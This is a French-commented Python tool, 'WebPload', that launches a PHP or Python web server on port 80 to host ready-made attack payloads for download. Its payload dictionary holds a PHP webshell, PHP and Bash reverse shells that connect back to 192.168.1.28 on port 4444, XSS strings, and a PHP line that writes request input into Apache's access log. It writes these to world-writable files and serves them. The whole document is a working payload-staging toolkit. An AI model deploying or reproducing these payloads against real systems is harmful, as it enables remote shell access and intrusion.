########################################################
###################### RESUME ##########################
########################################################


resume = "Serveur web automatisé avec répertoire temporaire de payloads prêts à l'emploi"
description = """WebPload est un module qui automatise entièrement la création et la gestion 
d'un serveur web Python temporaire pour héberger des payloads.
 
Fonctionnalités automatisées :
- Création et suppression automatique d'un serveur web Python sur le port 80
- Génération automatique d'un répertoire temporaire 'ploads' contenant les payloads
- Création automatique des fichiers de payloads prêts à l'emploi
- Nettoyage automatique du répertoire temporaire à la fermeture
 
Les payloads générés automatiquement incluent :
- Webshells PHP
- Reverse shells (PHP, Bash)
- Scripts XSS (JavaScript) 
- Pages HTML basiques
- Et plus encore...
 
Le serveur et les fichiers sont temporaires et sont automatiquement supprimés à la fermeture du module."""

pload = {
    "php": {
        "webshell": "<?php system($_GET['cmd']); ?>",
        "reverse_shell": "php -r '$sock=fsockopen(\"192.168.1.28\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "logger": "<?php file_put_contents('/var/log/apache2/access.log', $_GET['cmd']); ?>"
    },

    "js": {
        "xss_script": "<script>alert('XSS');</script>",
        "xss_iframe": "<iframe src=javascript:alert('XSS')></iframe>",
        "xss_img": "<img src=x onerror=alert('XSS')>"
    },

    "html": {
        "Hello_world": "<html><body><h1>Hello World !\nWebPload Open !</h1></body></html>",
        "webshell_php": "<html><?php system($_GET['cmd']); ?></html>"
    },
    
    "bash": {
        "reverse_shell": "bash -i >& /dev/tcp/192.168.1.28/4444 0>&1"
    }

}

########################################################
###################### IMPORTS ########################
########################################################    


import os
import socket
import subprocess
import shutil
from colorama import Fore, Style



########################################################
###################### Fonctions #####################
########################################################    


def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def main():
    
    # Vérifie si un serveur web python ou php est actif
    server_active = False
    server_type = None
    for proc in os.popen('ps aux'):
        if 'python -m http.server 80' in proc:
            server_active = True
            server_type = "python"
            break
        elif 'php -S 0.0.0.0:80' in proc:
            server_active = True 
            server_type = "php"
            break
    
    if server_active:
        # Si il y a un serveur web : demande a l'utilisateur si il veux fermer le WebPload
        close_server = input(Fore.LIGHTRED_EX + f"Un serveur web {server_type} est actif. Voulez-vous fermer le WebPload? (o/N): " + Style.RESET_ALL)
        if close_server.lower() in ['o', 'oui', 'yes', 'y']:
            print(Fore.LIGHTRED_EX + "Fermeture du serveur web..." + Style.RESET_ALL)
            if server_type == "python":
                os.system("pkill -f 'python -m http.server 80'")
            else:
                os.system("pkill -f 'php -S 0.0.0.0:80'")
            if os.path.exists(os.path.dirname(__file__)+'/ploads'):
                shutil.rmtree(os.path.dirname(__file__)+'/ploads')
    else:
        # Si non vérifie si le port 80 est libre
        if not is_port_in_use(80):
            # Si il n'y a pas de serveur web et que le port 80 est libre : demande a l'utilisateur si il veux ouvrir un WebPload
            open_server = input(Fore.LIGHTGREEN_EX + "Le port 80 est libre. Voulez-vous ouvrir un WebPload? (o/N): " + Style.RESET_ALL)
            if open_server.lower() in ['o', 'oui', 'yes', 'y']:
                # Demande le type de serveur
                server_choice = input(Fore.LIGHTGREEN_EX + "Quel type de serveur souhaitez-vous? (php/python - py) [" + Fore.YELLOW + "php" + Fore.LIGHTGREEN_EX + "]: " + Style.RESET_ALL).lower()
                if server_choice not in ['python', 'py']:
                    server_choice = 'php'
                
                ip_lan = subprocess.check_output("ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'", shell=True).decode().strip()
                print(Fore.LIGHTGREEN_EX + f"Ouverture du serveur web {server_choice}... Disponible sur : http://{ip_lan}" + Style.RESET_ALL)
                
                # Vérifie si le repertoire ploads existe dans le repertoire du fichier
                if os.path.exists(os.path.dirname(__file__)+'/ploads'):
                    # Si il existe, supprimer le repertoire
                    shutil.rmtree(os.path.dirname(__file__)+'/ploads')
                # Créer le repertoire
                os.makedirs(os.path.dirname(__file__)+'/ploads')

                # Créer dans le repertoire les fichiers contenant les payloads du dictionnaire dans le bon format
                for key, value in pload.items():
                    for payload_name, payload in value.items():
                        file_path = os.path.dirname(__file__)+'/ploads/'+payload_name+'.'+key
                        if not os.path.exists(file_path):
                            with open(file_path, 'w') as f:
                                f.write(payload)
                            # Définir les permissions 777 sur le fichier créé
                            os.chmod(file_path, 0o777)
                
                # Ouvre le serveur web choisi en silencieux sur le port 80
                if server_choice == 'php':
                    index_php = """<?php if (php_sapi_name() === 'cli-server') {$url = parse_url($_SERVER['REQUEST_URI']); $file = $_SERVER['DOCUMENT_ROOT'] . $url['path']; if (is_file($file) && basename($file) !== 'index.php') {header('Content-Type: text/plain'); readfile($file); exit();}} ?><!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>Explorateur de Fichiers</title><style>body{font-family:Arial,sans-serif;background:#121212;color:#e0e0e0;margin:0;padding:0;font-size:18px;}.container{max-width:1000px;margin:15px auto;background:#1e1e1e;padding:30px;border-radius:12px;box-shadow:0 6px 12px rgba(0,0,0,0.3);}h1{text-align:center;color:#bb86fc;font-size:50px;margin:10px 0 30px;}.breadcrumb{color:#888;margin-bottom:30px;font-size:20px;}.breadcrumb a{color:#00ccff;text-decoration:none;}.breadcrumb a:hover{color:#03dac6;}.search-container{display:flex;align-items:center;justify-content:space-between;margin-bottom:30px;gap:15px;}input[type="text"]{flex:1;padding:10px;border-radius:8px;border:1px solid #333;background:#2c2c2c;color:#e0e0e0;font-size:18px;}ul{list-style:none;padding:0;}li{padding:12px;border-bottom:1px solid #333;font-size:20px;}li a{text-decoration:none;}li a.file{color:#ff9900;}li a.directory{color:#00ccff;font-weight:bold;}li a:hover{color:#03dac6;}.home-btn,.search-btn{padding:10px 20px;background:#bb86fc;color:#121212;border-radius:8px;font-weight:bold;font-size:20px;border:none;cursor:pointer;}.home-btn:hover,.search-btn:hover{background:#e9b8ff;}</style></head><body><div class="container"><h1>WebPload</h1><?php $baseDir=__DIR__; $currentDir=isset($_GET['dir'])?realpath($baseDir.DIRECTORY_SEPARATOR.$_GET['dir']):$baseDir; $searchQuery=isset($_GET['search'])?strtolower($_GET['search']):''; if(strpos($currentDir,$baseDir)!==0)$currentDir=$baseDir; $relativePath=str_replace($baseDir,'',$currentDir); $pathParts=explode(DIRECTORY_SEPARATOR,trim($relativePath,DIRECTORY_SEPARATOR)); echo '<div class="breadcrumb">'; $path=''; foreach($pathParts as $part){if($part){$path.=DIRECTORY_SEPARATOR.$part; echo' / <a href="?dir='.urlencode(ltrim($path,DIRECTORY_SEPARATOR)).'">'.htmlspecialchars($part).'</a>';}} echo'</div>'; echo '<form method="get" action="" class="search-container">'; echo '<input type="hidden" name="dir" value="'.htmlspecialchars(trim($relativePath,DIRECTORY_SEPARATOR)).'">'; echo '<a href="?" class="home-btn">Home</a>'; echo '<input type="text" name="search" placeholder="Pload..." value="'.htmlspecialchars($searchQuery).'">'; echo '<button type="submit" class="search-btn">Recherche</button>'; echo'</form>'; function listFiles($dir,$baseDir,$searchQuery){$files=scandir($dir);$dirs=[];$normalFiles=[];foreach($files as $file){if($file!="."&&$file!=".."){$path=$dir.DIRECTORY_SEPARATOR.$file;$relativePath=str_replace($baseDir.DIRECTORY_SEPARATOR,'',$path);if(is_dir($path)){$dirs[]=['name'=>$file,'path'=>$relativePath];}else{if($file!=='index.php'){$normalFiles[]=['name'=>$file,'path'=>$relativePath];}}}}usort($dirs,fn($a,$b)=>strcasecmp($a['name'],$b['name']));usort($normalFiles,fn($a,$b)=>strcasecmp($a['name'],$b['name']));foreach($dirs as $dir){echo"<li><a class='directory' href='?dir=".htmlspecialchars($dir['path'])."'>".htmlspecialchars($dir['name'])."</a></li>";}foreach($normalFiles as $file){if($searchQuery===''||strpos(strtolower($file['name']),$searchQuery)!==false){echo"<li><a class='file' href='".htmlspecialchars($file['path'])."' target='_blank'>".htmlspecialchars($file['name'])."</a></li>";}}} function searchFilesRecursive($dir,$baseDir,$searchQuery){$results=[];$iterator=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));foreach($iterator as $file){if($file->isFile()&&$file->getFilename()!=='index.php'){$relativePath=str_replace($baseDir.DIRECTORY_SEPARATOR,'',$file->getPathname());if(strpos(strtolower($file->getFilename()),$searchQuery)!==false)$results[]=$relativePath;}}sort($results);foreach($results as $result){echo"<li><a class='file' href='".htmlspecialchars($result)."' target='_blank'>".htmlspecialchars($result)."</a></li>";}} echo'<ul>'; if($searchQuery){searchFilesRecursive($currentDir,$baseDir,$searchQuery);}else{listFiles($currentDir,$baseDir,$searchQuery);} echo'</ul>'; ?></div></body></html>"""

                    # Écriture du fichier index.php
                    with open(os.path.dirname(__file__)+'/ploads/index.php', 'w') as f:
                        f.write(index_php)
                    # Définir les permissions 777 sur le fichier index.php
                    os.chmod(os.path.dirname(__file__)+'/ploads/index.php', 0o777)
                    # Démarrage du serveur PHP
                    subprocess.Popen(['php', '-S', '0.0.0.0:80', 'index.php'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=os.path.dirname(__file__)+'/ploads')
                else:
                    subprocess.Popen(['python', '-m', 'http.server', '80'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=os.path.dirname(__file__)+'/ploads')

        else:
            # Si il n'y a pas de serveur web et que le port 80 est occupé : affiche une erreur
            print(Fore.LIGHTRED_EX + "Erreur: Le port 80 est occupé." + Style.RESET_ALL)


if __name__ == "__main__":
    main()
